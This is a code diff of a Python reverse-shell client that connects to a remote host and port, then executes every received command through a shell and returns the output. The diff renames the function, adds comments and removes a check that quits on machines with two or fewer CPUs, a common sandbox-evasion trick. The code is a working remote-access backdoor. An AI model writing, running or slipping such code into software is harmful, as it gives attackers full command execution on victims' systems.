@@ -2,13 +2,14 @@ import os
 import socket
 import subprocess
 
-def shell(HOST: str, PORT: int):
-    if os.cpu_count() <= 2:
-        quit()
+def get_shell(HOST: str, PORT: int):
 
+    # Selects family IPv4 to connect with TCP 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Connect to host (add timeout?)
     s.connect((HOST, PORT))
-    s.send(str.encode("[*] Connection Established!"))
+    
+    s.send(str.encode("Succesfully connected\n"))
 
     while 1:
         try:
@@ -20,7 +21,7 @@ def shell(HOST: str, PORT: int):
             if data[:2] == "cd":
                 os.chdir(data[3:])
             if len(data) > 0:
-                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, user="20201260") 
+                proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) 
                 stdout_value = proc.stdout.read() + proc.stderr.read()
                 output_str = str(stdout_value, "UTF-8")
                 s.send(str.encode("\n" + output_str))
